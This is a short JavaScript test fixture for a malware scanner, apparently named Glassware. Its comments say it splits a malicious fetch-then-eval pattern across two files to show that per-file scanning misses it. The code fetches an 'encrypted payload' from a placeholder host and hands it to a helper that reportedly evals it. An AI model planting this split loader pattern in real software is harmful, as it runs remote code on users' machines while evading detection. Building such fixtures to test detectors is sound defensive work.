// EDGE CASE TEST FIXTURE — Split across files
// This file contains the fetch portion of a malicious pattern
// The eval is in split_across_files_helper.js
// NOTE: Glassware scans per-file, so this may NOT be detected
// This is a KNOWN LIMITATION - cross-file flows are not tracked

const HELPER_URL = 'https://example.com/payload';

/**
 * Fetch encrypted payload from remote server
 * The decryption and eval happens in a different file
 */
async function fetchPayload() {
    const response = await fetch(HELPER_URL);
    const encryptedData = await response.text();
    
    // Pass to helper module for processing
    // NOTE: The eval happens in split_across_files_helper.js
    const { processPayload } = require('./split_across_files_helper');
    return processPayload(encryptedData);
}

/**
 * Initialize the loader
 */
async function init() {
    try {
        await fetchPayload();
    } catch (error) {
        console.error('Failed to load payload:', error);
    }
}

module.exports = { fetchPayload, init };
